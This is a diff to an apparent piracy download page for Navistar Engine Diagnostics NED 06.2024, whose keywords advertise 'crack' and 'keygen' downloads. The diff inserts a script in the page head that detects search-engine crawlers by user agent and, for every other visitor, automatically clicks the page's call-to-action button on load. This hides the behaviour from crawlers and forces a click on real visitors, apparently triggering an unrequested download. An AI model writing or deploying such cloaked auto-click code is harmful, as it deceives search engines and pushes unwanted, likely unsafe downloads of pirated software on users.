@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Navistar Engine Diagnostics 7.10,14 NED 06.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Navistar Engine Diagnostics NED 06.2024 is a comprehensive diagnostic software for Navistar engines, supporting all J1939 International electronic engine systems.">
     <meta name="keywords" content="Navistar Engine Diagnostics, Navistar Engine Diagnostics NED 06.2024, Navistar Engine Diagnostics download, Navistar Engine Diagnostics free download, Navistar Engine Diagnostics crack, Navistar Engine Diagnostics keygen, Navistar diagnostics software, Navistar diagnostics software download, Navistar diagnostics software free download, NED v7.10.14 download, NED v7.10.14 free download, NED 2024 download, NED 2024 free download, Navistar engine diagnostic tool, Navistar engine programming, Navistar engine diagnostic challenge, J1939 International engine systems, MaxxForce engines diagnostics, International A26 diagnostics, CAT engines diagnostics, Perkins engines diagnostics, Navistar каталог бесплатная загрузка, Автопарк двигателей Navistar, Диагностическое программное обеспечение Navistar, Navistar диагностика программного обеспечения скачать, Navistar программа диагностики двигатель приложение">
     <style>
